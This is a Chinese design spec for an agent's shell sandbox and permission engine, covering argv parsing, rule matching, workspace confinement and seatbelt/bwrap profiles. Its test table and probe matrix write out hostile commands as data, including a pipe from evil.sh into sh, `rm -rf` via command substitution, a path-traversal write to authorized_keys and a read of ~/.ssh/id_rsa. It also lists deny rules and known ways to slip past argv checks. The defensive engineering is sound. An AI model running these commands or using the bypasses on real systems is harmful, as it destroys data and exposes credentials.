# 执行沙箱 + argv 结构化权限引擎

> 生成的实现规格草案，随实现验证；其中每个具体数字都要自己重测。
> 取舍与优先级见 [../BUILD_LIST_CN.md](../BUILD_LIST_CN.md)。

`Execution sandbox + argv-structural permission engine (`mini_agent/sandbox/`, `mini_agent/permissions/`)`


## 一句话

每一次工具调用都经过一个装饰器：把请求解析成结构（shell argv 分段 / realpath 化的文件目标），按 allow/ask/deny 规则匹配，**最严者胜**、**无法解析即 fail-closed**；只有当某次调用的 OS 级沙箱（macOS seatbelt、Linux bwrap）被*证实*激活时，才把 `ask` 降级为 `allow`。

## 为什么这是难点

agent 的其他子系统出错时都能优雅退化。上下文压缩坏了，agent 变笨而已。权限判断错了，agent 就会造成破坏，而且这种失败不可恢复、不留日志。

真正难的地方在于：两种直觉设计都是死路，而且失败方向相反。纯提示词的 UX 半衰期大约两天：用户一小时内撞上 `curl | sh`、`pytest`、`npm ci`、`git status` 二十次，然后发现"总是允许"或 `--yolo` 这个逃生口，从此权限引擎沦为装饰。纯静态分析 shell 字符串则是不可判定的——`bash -c "$PAYLOAD"`、`` `id` ``、heredoc、`$IFS` 分词、PATH 遮蔽，全都能击穿 argv 检查，而且失败是静默的。

让真实 agent 跑得通的洞见是：这两个机制**互为承重结构**。沙箱买来了自动批准的权利，因为一次错误的 `allow` 现在被容器住了，而不是灾难性的；权限引擎则让你能把沙箱收得很紧，因为那少数真正需要逃出沙箱的事情（网络安装、workspace 之外的写入）会路由给人类，而不是逼你为所有人放松 profile。把这层耦合做对——以及沙箱*无法被验证*时的 fail-closed 方向——就是整个设计。

## 仓库现状

**完全没有**任何执行环节的强制约束。对 `mini_agent/` 跑 `grep -rn "permission\|approve\|sandbox\|confirm"`（排除 vendored 的 `skills/`）什么都返回不了。

**1. Bash 是一个没有闸门的裸 shell。**
`mini_agent/tools/bash_tool.py:391-396`（前台）和 `:354-359`（后台）直接把模型给的字符串原封不动交给 `asyncio.create_subprocess_shell(command, ..., cwd=self.workspace_dir)`。`:339` 处的 `shell_cmd = command` 字面就是原始字符串。`cwd=self.workspace_dir` 是*唯一*的约束，而 `cd ..` 一个 token 就破了它。没有任何东西检查命令；没有任何东西询问用户。`workspace_dir` 在 `:235` 存成一个普通的 `str`，默认值是 `None`（`:225`），`tests/test_bash_tool.py:15` 正依赖这一点（`BashTool()` 不带 workspace）。

**2. 文件工具没有路径约束，而且解析方式是错的。**
`ReadTool.__init__`（`file_tools.py:72`）、`WriteTool.__init__`（`:164`）、`EditTool.__init__`（`:221`）全都用 `Path(workspace_dir).absolute()`。`.absolute()` **不**解析符号链接——实测：macOS 上 `Path("/tmp/x").absolute()` → `/tmp/x`，而 `.resolve()` → `/private/tmp/x`。然后 `execute()` 做的是：
```python
file_path = Path(path)
if not file_path.is_absolute():
    file_path = self.workspace_dir / file_path      # :113-114, :200-201, :261-262
```
而且从来不把结果和 workspace 比较。`WriteTool` 接着执行 `file_path.parent.mkdir(parents=True, exist_ok=True)`（`:204`），然后 `write_text`（`:206`）。所以 `write_file(path="../../../../Users/flame/.ssh/authorized_keys")` **今天就能成功**，`write_file(path="/etc/anything")` 也一样——绝对路径分支完全跳过了 workspace 拼接。`EditTool` 在 `:280` 用 `content.replace(old_str, new_str)`（替换*所有*匹配，尽管 `:230-232` 的 docstring 承诺唯一性），然后不做任何检查就写回。

**3. 分发点被复制了一份，而且已经漂移。**
`agent.py:404` 遍历 `response.tool_calls`；`:427` 检查 `function_name not in self.tools`；`:435-436` 在一个宽泛的 `try/except Exception`（`:437-448`）里执行 `tool = self.tools[function_name]; result = await tool.execute(**arguments)`。同一个循环的**第二份独立副本**位于 `acp/__init__.py:146-160`（`tool = agent.tools.get(name)` → `:157` 的 `result = await tool.execute(**args)`）。任何放在 `agent.py` 里的闸门，在 ACP server 里都会静默缺席。

**4. 工具构造是集中的（这是好消息）。**
`cli.py:399` 的 `add_workspace_tools()` 在 `:414` 构造 `BashTool(workspace_dir=str(workspace_dir))`，在 `:422-424` 构造 `ReadTool/WriteTool/EditTool`。`acp/__init__.py:174` 调用同一个 `initialize_base_tools` 加这个函数。包装只有这一个咽喉点。

**5. TTY 已经被抢占了。**
`cli.py:721-772` 启动一个 daemon 线程，对 `sys.stdin` 调用 `tty.setcbreak(fd)`，并在*整个 `agent.run()` 期间*（`cli.py:770`，在 `:775-777` 的 `finally` 里恢复）用 `select` 循环监听 Esc。任何权限提示都是从 `tool.execute()` 内部弹出的——也就是那个线程正以 cbreak 模式占着 stdin 的时候。提示里天真地用 `input()`，按键会被 Esc 监听器吃掉。

**6. 配置没有任何这方面的入口。** `ToolsConfig`（`config.py:48-63`）只有 `enable_bash`/`enable_file_tools` 两个布尔值，别的没有；`Config.from_yaml` 在 `:148-157` 逐字段手工解析。

## 最小实现

## 目录结构

```
mini_agent/sandbox/__init__.py     # Sandbox ABC, detect(), NoSandbox
mini_agent/sandbox/seatbelt.py     # macOS sandbox-exec + SBPL profile
mini_agent/sandbox/bwrap.py        # Linux bubblewrap
mini_agent/sandbox/profile.sb      # the SBPL template (data, not f-string)
mini_agent/permissions/parser.py   # raw string -> Plan
mini_agent/permissions/policy.py   # Plan -> Decision
mini_agent/permissions/rules.py    # the default ruleset
mini_agent/permissions/prompter.py # TTY prompt + non-interactive fallback
mini_agent/permissions/guard.py    # GuardedTool decorator
mini_agent/permissions/confine.py  # realpath workspace confinement
tests/test_permission_corpus.py    # the adversarial table
scripts/sandbox_probe.py           # the honest escape-attempt matrix
```

---

## 1. `permissions/parser.py` — 结构，而不是正则

```python
Verdict = IntEnum("Verdict", "DENY ASK ALLOW")   # strictest == min()

@dataclass(frozen=True)
class Segment:
    argv: tuple[str, ...]              # ("git", "status", "--short")
    env: tuple[tuple[str, str], ...]   # leading VAR=val assignments
    write_targets: tuple[str, ...]     # from > and >> redirections
    unresolved: bool                   # contained an unquoted $VAR
    depth: int                         # subshell nesting, for display

@dataclass(frozen=True)
class Plan:
    segments: tuple[Segment, ...]
    raw: str

class ParseError(Exception):
    """Fail-closed. Carries .reason for the deny message."""
```

**步骤 A —— 在任何词法分析之前，对 RAW 字符串做引号状态扫描。**
这一步必须最先做，而且没法在 token 上做。实测：`shlex.split("echo '$X'")` → `['echo', '$X']`，与 `echo $X` 的输出逐字节相同。Posix 词法分析*把你需要的引号信息销毁了*。

```python
def scan_expansions(raw: str) -> tuple[list[str], str | None]:
    """Return (unquoted expansion sigils found, unterminated quote char or None)."""
    i, q, found = 0, None, []
    while i < len(raw):
        c = raw[i]
        if q == "'":
            if c == "'": q = None
        elif q == '"':
            if c == "\\": i += 1
            elif c == '"': q = None
            elif c in "$`": found.append(c)
        else:
            if c in "'\"": q = c
            elif c == "\\": i += 1
            elif c in "$`": found.append(c)
        i += 1
    return found, q
```
已对以下用例验证：`"echo '$X'"` → `([], None)`；`'echo "$X"'` → `(['$'], None)`；`"echo \\$X"` → `([], None)`；`"echo 'a"` → `([], "'")`。

然后：
- 引号未闭合 → `ParseError("unbalanced quote")`
- 任何未加引号的 `` ` `` → `ParseError("backtick command substitution")`（词法器*看不见*这些——实测：对 `` echo `rm -rf ~` `` 用 `punctuation_chars=True` 的 `shlex` 得到 `['echo', '`rm', '-rf', '~`']`，反引号粘在 token 上）
- 未加引号的 `$(` → `ParseError("command substitution")`
- 裸的未加引号 `$` → 在 plan 上置 `unresolved=True`，这会把最终判定封顶在 `ASK`（永不 `ALLOW`）
- 任何位置出现 `<<` → `ParseError("heredoc")`

**步骤 B —— 用 `punctuation_chars=True` 做词法分析，而不是 `shlex.split`。**
```python
lx = shlex.shlex(raw, posix=True, punctuation_chars=True)
lx.whitespace_split = True
try:
    tokens = list(lx)
except ValueError as e:
    raise ParseError(str(e))
```
`shlex.split()` 是那个直觉调用，而它是**错的**：实测 `shlex.split("npm run build; npm publish")` → `['npm', 'run', 'build;', 'npm', 'publish']`——`;` 粘在 `build` 上，第二条命令作为命令是不可见的。用 `punctuation_chars=True` 你得到 `['npm','run','build',';','npm','publish']`。

**步骤 C —— 切分成 segment。**
遍历 token；操作符 `&&`、`||`、`;`、`|`、`&`、`\n` 关闭当前 segment。`(` 让 depth 加一并开启新 segment；`)` 减一。重定向：`>`/`>>`/`1>`/`2>`/`&>` 把*下一个* token 吃进 `write_targets` 而不是 `argv`。`<` 吃掉并丢弃。

**步骤 D —— 逐 segment 归一化。**
把开头的 `NAME=value` token 剥进 `env`。剩下的第一个 token 是 `argv[0]`。

**步骤 E —— 递归进入 wrapper。** 按 `os.path.basename(argv[0])` 分派：
- `sh|bash|zsh|dash` 带 `-c` 标志 → 对 `-c` 的操作数重新 `parse()`，把得到的 segment 以 `depth+1` 拼接进来。已验证这是必需的：`shlex.split('bash -c "rm -rf /tmp/y"')` → `['bash','-c','rm -rf /tmp/y']`——payload 是一个不透明的 token。
- `env|nohup|nice|time|stdbuf` → 丢掉 wrapper 及其选项，对尾部重新分派。
- `sudo|doas|su` → 立即 `Verdict.DENY`，不递归。
- 带 `-exec` 的 `xargs|find`、`ssh <host> <cmd>` → `ParseError`（诚实一点：别假装能建模这些）。

---

## 2. `permissions/rules.py` + `policy.py`

```python
@dataclass(frozen=True)
class Rule:
    verdict: Verdict
    argv0: str                                   # basename, exact
    subcommands: frozenset[str] = frozenset()    # matched vs first non-flag arg; empty == any
    forbid_flags: frozenset[str] = frozenset()   # presence forces the verdict down to ASK
    paths_must_be_in_workspace: bool = False
```

默认规则集（约 35 条），例如：
```python
DEFAULT_RULES = [
    Rule(ALLOW, "git", {"status","diff","log","show","branch","rev-parse","ls-files"}),
    Rule(ASK,   "git", {"push","commit","checkout","reset","clean"},
         forbid_flags={"--force","-f","--hard"}),
    Rule(ALLOW, "ls"), Rule(ALLOW, "cat"), Rule(ALLOW, "grep"), Rule(ALLOW, "rg"),
    Rule(ALLOW, "head"), Rule(ALLOW, "wc"), Rule(ALLOW, "which"), Rule(ALLOW, "echo"),
    Rule(ALLOW, "pytest"), Rule(ALLOW, "python3", paths_must_be_in_workspace=True),
    Rule(ASK,   "npm", {"install","ci","publish","run"}),
    Rule(ASK,   "pip", {"install"}), Rule(ASK, "pip3", {"install"}),
    Rule(ASK,   "curl"), Rule(ASK, "wget"),
    Rule(ASK,   "rm", paths_must_be_in_workspace=True),
    Rule(DENY,  "sudo"), Rule(DENY, "doas"), Rule(DENY, "shutdown"),
    Rule(DENY,  "dd"), Rule(DENY, "mkfs"), Rule(DENY, "chown"),
]
```
未匹配的 `argv0` → `ASK`（默认询问，而不是默认拒绝；默认拒绝会让 agent 没法用，用户会把整套东西关掉）。

```python
class PolicyEngine:
    def __init__(self, rules, workspace: Path, sandbox: Sandbox,
                 session: SessionGrants, prompter: Prompter): ...

    async def check_bash(self, raw: str) -> Decision:
        try:
            plan = parse(raw)
        except ParseError as e:
            return Decision(DENY, f"cannot parse safely: {e}", plan=None)

        verdict, reasons = Verdict.ALLOW, []
        for seg in plan.segments:
            v, why = self._match(seg)
            if seg.unresolved:
                v = min(v, Verdict.ASK); why += " (unresolved expansion)"
            for t in seg.write_targets:
                if not confine.inside(t, self.workspace):
                    v = min(v, Verdict.ASK); why += f" (writes outside workspace: {t})"
            verdict = min(verdict, v)          # <-- strictest wins
            reasons.append(why)

        if verdict is Verdict.ASK and self.session.granted(plan):
            return Decision(ALLOW, "session grant", plan)

        # THE COUPLING. Only downgrade when the sandbox is *verified* live.
        if verdict is Verdict.ASK and self.sandbox.verified_active():
            return Decision(ALLOW, f"sandboxed ({self.sandbox.name})", plan,
                            sandboxed=True)

        if verdict is Verdict.ASK:
            return await self.prompter.ask(plan, reasons)   # -> ALLOW/DENY/session-grant
        return Decision(verdict, "; ".join(reasons), plan)
```

`SessionGrants` 以**规范化结构**为键，绝不用原始字符串：
```python
def grant_key(seg: Segment) -> str:
    sub = next((a for a in seg.argv[1:] if not a.startswith("-")), "*")
    return f"{os.path.basename(seg.argv[0])}:{sub}"      # "npm:test"
```

---

## 3. `permissions/confine.py`

```python
def resolve_in_workspace(path: str, workspace: Path, *, must_exist: bool) -> Path:
    ws = workspace.resolve()                     # NOT .absolute()
    p  = Path(path)
    p  = (ws / p) if not p.is_absolute() else p
    real = p.resolve()                           # follows symlinks, ok on missing tails
    if not real.is_relative_to(ws):              # NOT str.startswith
        raise Confinement(f"{path} resolves to {real}, outside {ws}")
    if must_exist and not real.exists():
        raise Confinement(f"{path} does not exist")
    return real
```
两条注释都经过实测：`link -> /etc/passwd` 时 `Path("/private/tmp/sbws/sub/link").resolve()` 得到 `/private/etc/passwd`（所以 `.resolve()` *确实*能抓住符号链接逃逸）；而 `"/a/ws-evil/x".startswith("/a/ws")` 是 `True`，`Path("/a/ws-evil/x").is_relative_to("/a/ws")` 却是 `False`。

---

## 4. `sandbox/seatbelt.py`

`profile.sb` 以**带 `(param ...)` 占位符的数据文件**形式发布——**绝不用 f-string**：
```scheme
(version 1)
(allow default)

(deny file-write*)
(allow file-write* (subpath (param "WS")))
(allow file-write* (subpath (param "TMP")))
(allow file-write* (subpath (param "GITDIR")))
(allow file-write* (literal "/dev/null") (literal "/dev/stdout")
                   (literal "/dev/stderr") (literal "/dev/tty"))
(allow file-write-data (regex #"^/dev/tty"))

(deny network-outbound (remote ip "*:*"))
(allow network-outbound (remote unix-socket))
```

```python
class SeatbeltSandbox(Sandbox):
    name = "seatbelt"
    def wrap(self, argv: list[str]) -> list[str]:
        return ["/usr/bin/sandbox-exec",
                "-D", f"WS={self.ws}",
                "-D", f"TMP={self.tmp}",
                "-D", f"GITDIR={self.gitdir}",
                "-f", str(self.profile_path), *argv]
```
`self.ws/tmp/gitdir` 全部经过 `.resolve()`。`gitdir` 是最近的外层仓库的 `.git`（从 workspace 向上走找到），找不到就用 workspace 自身。

`verified_active()` 在**启动时跑一次**，缓存结果，它就是 fail-closed 的闸门：
```python
def _probe(self) -> bool:
    canary = self.ws / ".sandbox_probe"
    outside = Path(tempfile.gettempdir()).resolve() / ".ma_probe_outside"
    rc_in  = subprocess.run(self.wrap(["/bin/sh","-c",f"touch {sh(canary)}"]),
                            capture_output=True).returncode
    rc_out = subprocess.run(self.wrap(["/bin/sh","-c",f"touch {sh(outside)}"]),
                            capture_output=True).returncode
    canary.unlink(missing_ok=True)
    return rc_in == 0 and rc_out != 0     # must both succeed inside AND fail outside
```
这不是多疑：格式错误的 profile 退出码是 **65**（实测：`sandbox-exec: syntax error ... rc=65`），缺少 `-D` 参数也是 65，报 `invalid data type of path filter`。只检查"跑起来没有"，会在沙箱其实没生效时把它标成已激活，于是 `ASK → ALLOW` 的降级就会自动批准*未被沙箱包住的*命令。探针必须确认拒绝那一侧真的拒绝了。

## 5. `sandbox/bwrap.py`
```python
["bwrap","--die-with-parent","--unshare-net","--unshare-pid",
 "--ro-bind","/","/", "--dev","/dev","--proc","/proc",
 "--bind",str(ws),str(ws), "--bind",str(tmp),str(tmp),
 "--chdir",str(ws), "--", *argv]
```
同样的 `_probe()` 契约。两个二进制都不存在时 `detect()` 返回 `NoSandbox`——而 `NoSandbox.verified_active()` 返回 `False`，所以在不支持的平台上引擎干脆永不降级，每个 `ask` 都会到人手上。这就是优雅的空操作。

---

## 6. 现有调用点的具体改动

**`mini_agent/tools/bash_tool.py`**
- `:225-235` —— `__init__(self, workspace_dir=None, sandbox: Sandbox | None = None)`；存 `self.sandbox = sandbox or NoSandbox()`。保持 `workspace_dir=None` 可用（`tests/test_bash_tool.py:15`）。
- `:334-339` —— 把 `shell_cmd = command` 那一支换成
  `argv = self.sandbox.wrap(["/bin/bash", "-c", command])`。注意这把 Unix 上的执行从 `create_subprocess_shell` 改成了 `create_subprocess_exec`，这也是为什么要显式传 `/bin/bash -c` 来保持语义。实测：`sandbox-exec` 原地 exec，透传子进程退出码（`exit 42` → `rc=42`），并且 stdin 能穿过去。
- `:354-359` —— 后台分支：`create_subprocess_shell(shell_cmd, ...)` → `create_subprocess_exec(*argv, ...)`。
- `:391-396` —— 前台分支：同样的替换。
- 新增，在 `:399` 的 `communicate()` 之后：如果 `returncode == 65` 且 stderr 以 `sandbox-exec:` 开头，返回一个独立的错误（"sandbox profile failed to load"），而不是报成命令失败。

**`mini_agent/tools/file_tools.py`**
- `:72`、`:164`、`:221` —— `Path(workspace_dir).absolute()` → `.resolve()`。
- `:111-114`（Read）、`:198-201`（Write）、`:259-262`（Edit）—— 把那三行 `Path(path) / is_absolute / workspace_dir /` 的块换成
  `file_path = resolve_in_workspace(path, self.workspace_dir, must_exist=<True|False|True>)`，外面包一层，让 `Confinement` 返回 `ToolResult(success=False, error=...)`。
- `:204` 的 `mkdir(parents=True)` 现在跑在一个已经受约束的路径上。

**`mini_agent/cli.py`**
- `:399` 签名 → `add_workspace_tools(tools, config, workspace_dir, engine: PolicyEngine)`。
- `:414-415` → `BashTool(workspace_dir=str(workspace_dir), sandbox=engine.sandbox)`，然后 `tools.append(GuardedTool(bash_tool, engine))`。
- `:420-426` → 把 `ReadTool/WriteTool/EditTool` 各自包进 `GuardedTool(..., engine)`。
- `:770` —— 在 `esc_thread.start()` 之前，把 pause/resume 这一对注册到 prompter 上：`prompter.bind_tty(pause=esc_listener_stop.set, resume=restart_esc_listener)`。`TerminalPrompter.ask()` 先调 `pause()`，自己用基于 `termios` 的单键读取（`y` / `n` / `a` = always），然后 `resume()`。没有这个，`:756-762` 的 Esc 监听器会把回答的那一次按键吃掉。

**`mini_agent/agent.py`** —— **不改。** `:436` 的 `await tool.execute(**arguments)` 已经走的是 `GuardedTool.execute(**kwargs)`。

**`mini_agent/acp/__init__.py`** —— **不改。** `:157` 白得这道闸门；prompter 检测到 `not sys.stdin.isatty()` 就返回 `DENY` 并附上模型能读的消息，而不是阻塞在一个永远不会来输入的 stdin 上。

**`mini_agent/config.py`** —— 往 `ToolsConfig`（`:48-63`）里加：
```python
class SandboxConfig(BaseModel):
    enabled: bool = True
    network: Literal["off", "on"] = "off"
    mode: Literal["ask", "auto", "strict"] = "ask"
```
以及在 `:148-157` 旁边配套的 `sandbox=SandboxConfig(**tools_data.get("sandbox", {}))` 那一行。

---

## 7. `permissions/guard.py`

```python
class GuardedTool(Tool):
    def __init__(self, inner: Tool, engine: PolicyEngine):
        self._inner, self._engine = inner, engine
    name = property(lambda s: s._inner.name)
    description = property(lambda s: s._inner.description)
    parameters = property(lambda s: s._inner.parameters)

    async def execute(self, **kwargs) -> ToolResult:
        d = await self._engine.check(self._inner.name, kwargs)
        if d.verdict is not Verdict.ALLOW:
            return ToolResult(success=False, content="",
                              error=f"Blocked by permission policy: {d.reason}")
        return await self._inner.execute(**kwargs)
```
`engine.check` 按工具名分派：`bash` → `check_bash(kwargs["command"])`；`write_file`/`edit_file` → 对 `kwargs["path"]` 做约束检查；`read_file` → 约束检查，允许；其他任何东西（MCP、skills）→ `ASK`，带上工具名和截断过的参数预览。

## 边界情况

1. **`shlex.split()` 会把操作符粘到词上。** 直觉做法（错的）：`shlex.split(cmd)` 然后遍历 token 列表找 `;`/`&&` 分隔符。实测失败：`shlex.split("npm run build; npm publish")` → `['npm','run','build;','npm','publish']`——`;` 从未作为 token 出现，`npm publish` 被解析成*给 `npm run` 的另外两个参数*，于是一条允许 `npm run` 的规则就静默放行了一次 publish。正确做法：`shlex.shlex(raw, posix=True, punctuation_chars=True)` 配 `whitespace_split=True`，得到 `[...,'build',';','npm','publish']`。推论：`punctuation_chars` 仍然**不**切分反引号—— `` echo `rm -rf ~` `` 词法化成 `['echo','`rm','-rf','~`']`，所以反引号必须在词法分析之前由原始字符串扫描器抓住，而不是靠检查 token。

2. **Posix 词法分析销毁了你判断展开所需的引号信息。** 直觉做法（错的）：词法分析之后扫 token 找 `$` 并标记。实测失败：`shlex.split("echo '$X'")` → `['echo','$X']`，与 `echo $X` 的结果逐字节相同。于是你要么拒绝每一个字面美元符号（这会弄坏 `git commit -m 'costs $5'`、`awk '{print $1}'`——用户会把功能关掉），要么就接受真实的展开。正确做法：先对**原始字符串**跑一个手写的引号状态机，它能正确报出 `echo '$X'` → 无展开、`echo "$X"` → 有展开、`echo \$X` → 无展开，并且顺带检测到 `echo "foo` 里未闭合的引号——那恰恰是 fail-closed 的触发条件，因为 `shlex` 会抛 `ValueError: No closing quotation`，而那句直觉的 `except: pass` 会把一次解析失败变成一次未经检查的执行。

3. **Seatbelt 按 realpath 匹配，而 `Path.absolute()` 不解析符号链接。** 直觉做法（错的）：`-D WS={Path(workspace).absolute()}`。实测失败：macOS 上 workspace 位于 `/tmp` 下时，含 `(subpath "/tmp/sbws")` 的 profile 会让 `touch /tmp/sbws/a` → `Operation not permitted`，而把同一份 profile 改成 `(subpath "/private/tmp/sbws")` 就成功——内核在评估规则之前先把 `/tmp → /private/tmp` 解析掉了，于是沙箱拒绝了对 agent *自己 workspace* 的写入，每条命令都莫名其妙地失败。正确做法：到处都用 `.resolve()`——`WS`、`TMPDIR`，以及约束比较。相关的一条：绝不要把路径 f-string 拼进 SBPL 源码。已实测 `-D 'WS=/tmp") (allow file-write* (subpath "/'` **不会**注入——`-D` 参数是作为值绑定的，不是作为文本插值——这也正是为什么 `(param "WS")` 是正确的机制而字符串格式化不是。

4. **`(deny file-write*)` 会杀掉 `TMPDIR`，顺带带走整个 Python 生态。** 直觉做法（错的）：拒绝所有写入，允许 workspace，完事。实测失败：在那份 profile 下，`python3 -c "import tempfile; tempfile.NamedTemporaryFile()"` 抛出 `FileNotFoundError: No usable temporary directory found in ['/var/folders/.../T/', '/tmp', '/var/tmp', ...]`——pytest、pip、npm 和 git 全都立刻坏掉。同一份 profile 的第二个实测失败：当 workspace 是某个 git 仓库的子目录时，`git add f.txt && git commit` 会失败并报 `Unable to create '/private/tmp/repo/.git/index.lock': Operation not permitted`，因为 `.git` 在 workspace *之上*。正确做法：可写集合是 `{resolve(workspace), resolve(TMPDIR), resolve(nearest-enclosing .git), /dev/null, /dev/std*, /dev/tty}`——而那条外层 `.git` 的授权是一次刻意的、说得出口的放宽，不是疏忽。

5. **`(remote ip "localhost:*")` 会静默放行*全部*出站流量。** 直觉做法（错的）：拒绝网络，然后放行 loopback，好让 agent 能 curl 自己的开发服务器。逐条规则隔离后的实测失败：单独的 `(deny network-outbound)` 能挡住 `curl https://example.com`（rc=7）；加上 `(allow network-outbound (remote unix-socket))` 仍然挡得住（rc=7）；再加上 `(allow network-outbound (remote ip "localhost:*"))`，`curl https://example.com` 就返回 **HTTP 200**。而且 SBPL 直接拒绝 `(remote ip "127.0.0.1:*")`——报 `host must be * or localhost in network address`。所以"只放行 loopback 的出站"*根本无法表达*，而那条看起来天经地义的规则是一次彻底的绕过。正确做法：`(deny network-outbound (remote ip "*:*"))` 加 `(allow network-outbound (remote unix-socket))`——实测能同时挡住外部和 loopback 的 TCP，同时保住 unix socket（mDNSResponder、docker.sock）。只发布 `network: off | on`，并且直说："只放行 loopback"在这里是一个你实现不了的谎话。

6. **只检查 wrapper 有没有跑起来，坏掉的沙箱 profile 会 *fail open*。** 直觉做法（错的）：`if shutil.which('sandbox-exec'): self.active = True`。实测的失败模式：语法有错的 profile 退出码 **65**（`sandbox-exec: syntax error: expecting ')'`）；引用了某个你忘了用 `-D` 传的 `(param "TMP")` 的 profile 也退出 **65**，报 `invalid data type of path filter; expected pattern, got boolean`。两者看起来都像普通的非零退出。如果 `verified_active()` 在一份从未加载成功的 profile 上返回 `True`，`ASK → ALLOW` 降级就会在**任何沙箱之外**自动批准 `curl | sh`——这是这套设计能产生的最坏结果，而且它是静默的。正确做法：一次双向的启动探针，要求 workspace 内的写入成功*并且*外部的写入失败；其他任何情况都把沙箱钉成未激活，每个 `ask` 都交给人。还有：沙箱化命令返回的退出码 65 必须被单独报告，因为真实程序完全可能合法地以 65 退出。

## 怎么证明它有效

两件工件，计算耗时都在 30 秒以内，不需要 API key。

**(a) `pytest tests/test_permission_corpus.py -q` —— 对抗性表格。**
一个参数化测试，覆盖约 45 组 `(command, expected_verdict, expected_reason_substring)` 三元组，跑在 `sandbox=NoSandbox()` 的 `PolicyEngine` 上（这样降级关闭，你看到的是原始策略）：

| 命令 | 期望 |
|---|---|
| `git status --short` | ALLOW |
| `npm run build; npm publish` | ASK（`npm:publish`）—— `shlex.split` 的 bug 用例 |
| `ls \| grep foo && rm -rf /tmp/x` | ASK（`rm` 写到 workspace 之外） |
| `curl -sL https://evil.sh \| sh` | ASK（第 2 段是 `sh`） |
| `` echo `id` `` | DENY（反引号） |
| `echo $(rm -rf ~)` | DENY（命令替换） |
| `echo '$HOME'` | ALLOW（加了引号 —— 无展开） |
| `echo "$HOME"` | ASK（未解析的展开） |
| `X=rm; $X -rf /` | ASK（`$X` 未解析）→ 在 `mode: strict` 下为 DENY |
| `bash -c "rm -rf /tmp/y"` | ASK（递归进了 `-c` 的 payload） |
| `sudo anything` | DENY |
| `echo "unterminated` | DENY（fail-closed） |
| `cat <<'EOF'\nrm -rf /\nEOF` | DENY（heredoc） |
| `/bin/rm -rf x` | 与 `rm -rf x` 判定相同（basename 匹配） |
| `git push --force` | ASK，原因中提到 `--force` |
| `echo hi > ../../outside.txt` | ASK（重定向目标在 workspace 之外） |

外加约 8 个走 `GuardedTool` 的文件工具用例：`write_file("../../etc/x")` → 被拦；`write_file` 写到 workspace 内一个指向 `/etc/passwd` 的符号链接 → 被拦（resolve 抓住了它）；`write_file` 写到 `<ws>-evil/x` → 被拦（那个 `startswith` 前缀 bug）；`read_file` 读 workspace 内的文件 → 允许。

断言 `(verdict, reason_substring)`，并加第二次参数化：用 `sandbox=FakeActiveSandbox()` 重跑整个语料，断言每个 `ASK` 都变成 `ALLOW`、每个 `DENY` 都还是 `DENY`。那第二遍*就是*架构主张本身，以测试的形式表达出来。

**(b) `python3 scripts/sandbox_probe.py` —— 诚实的矩阵。**
创建一个临时 workspace，构造两次真实的 `BashTool`（一次 `NoSandbox`，一次 `SeatbeltSandbox`），把 8 条真实命令在两边都跑一遍，打印一张 `OK`/`BLOCKED` 的表：

```
                                              no-sandbox   seatbelt
touch $WS/inside.txt                                  OK         OK
touch $HOME/pwned                                     OK    BLOCKED
touch $WS/link_to_etc/x   (symlink escape)            OK    BLOCKED
curl -s -m5 -o /dev/null https://example.com          OK    BLOCKED
python3 -c "tempfile.NamedTemporaryFile()"            OK         OK   <- TMPDIR grant
git commit (repo root above workspace)                OK         OK   <- .git grant
cat ~/.ssh/id_rsa                                     OK         OK   <- NOT PREVENTED
echo evil >> $WS/Makefile                             OK         OK   <- NOT PREVENTED
```

最后两行才是这个脚本的意义所在：交付物自带一个*点名自己缺口*的演示。读 `~/.ssh` 是被允许的（实测：该 profile 下 `ls ~/.ssh` → `READABLE`），而 workspace 内部的写入可以污染一个你之后要 push 的仓库。脚本把这两行打印在 `NOT PREVENTED — see README §limits` 一节里，而不是藏起来。

两个都跑，把两份输出贴进 README。这就是全部的演示。

## 深度追问

1. **"为什么解析 argv 而不是对命令字符串做正则——以及为什么不直接用一个真正的 bash parser？"** 强答案：对原始字符串做正则毫无引号概念，所以 `git commit -m 'rm -rf /'` 会误报，而 `npm run build; npm publish` 会漏报，并且每给正则打一个补丁就制造一个新的绕过口。基于 `(basename(argv0), 第一个非 flag 参数)` 的结构化匹配对空白、flag 顺序和绝对路径都稳定。被否掉的方案：`bashlex` / `tree-sitter-bash`——真正的文法能买来正确的 heredoc 和 `$( )` 嵌套，但 (i) 对一个演示仓库来说这是一个新依赖，(ii) 它并不解决真正的问题，因为把 `bash -c "$PAYLOAD"` 解析得再完美，留给你的仍然是一个不透明的变量。决定性的一点：shell 命令分类*在一般情况下是不可判定的*——`eval`、`$IFS` 分词（`ls$IFS-la` 词法化成一个 token，实测）、PATH 遮蔽、heredoc，全都能击穿任何 parser。所以 parser 的职责不是完备，而是**在可解析子集上正确，在其余部分大声地 fail-closed**，漏下去的由沙箱接住。声称自己的 parser 密不透风的候选人，是没想清楚。

2. **"解释一下 ask→allow 的降级。这不就是在削弱你自己的安全性吗？"** 强答案：它就是那个承重的耦合。只靠提示词的 UX 半衰期大约两天——`pytest`、`npm ci`、`git status` 不停触发，用户找到绕过口，引擎沦为装饰；一套没人愿意开着的权限系统提供的安全性是零。沙箱改变的是*出错的代价*：在 seatbelt 里对 `curl | sh` 误发的一次 `allow` 无法写到 workspace 之外、也够不着网络，于是它从灾难性降级成了讨厌。这才是激进的自动批准策略站得住脚的原因。耦合的方向极其重要：`sandbox_active → 降级` 必须以一次**经过验证**的探针为门，绝不能以 `shutil.which('sandbox-exec')` 为门。实测失败：语法有错的 profile，或者引用了你忘了传的 `(param)` 的 profile，退出码 65，看起来和普通命令失败一模一样。要是你在那里缓存了 `active=True`，你就是在静默地自动批准未沙箱化的命令——严格地比两个机制都没有还糟。所以要双向探针：内部写入必须成功*并且*外部写入必须失败。

3. **"给我讲讲 `A && B` 上的最严者胜。`||` 不是不一样吗——B 只在 A 失败时才跑？"** 强答案：就*判定*而言，`&&`、`||`、`;`、`|`、`&` 全都一样——每一段都是一条可能执行的命令，你必须在最坏调度下也安全，所以判定是对各段取 `min()`。不同的是你*给用户看什么*：`curl … | sh` 需要提示界面展示分解结果（`[1] curl …  [2] sh ← 风险在这`），而不是原始字符串，因为原始字符串正是一开始骗过用户的东西。更微妙的问题是 **cwd 在 `;` 之间是有状态的**：在 `cd / ; rm -rf tmp` 里，一个假设 `cwd == workspace` 的逐段路径检查会误判第二段。两个诚实的选项——把一个符号化的 cwd 穿过 segment 列表，遇到第一个非字面量 `cd` 就放弃；或者（我会发布的那个）一旦任何一段是 `cd` 到 workspace 之外，就把整个 plan 封顶在 ASK。还值得点名：`bash -c` 递归需要一个深度上限，因为 `bash -c 'bash -c "..."'` 可以无限嵌套。

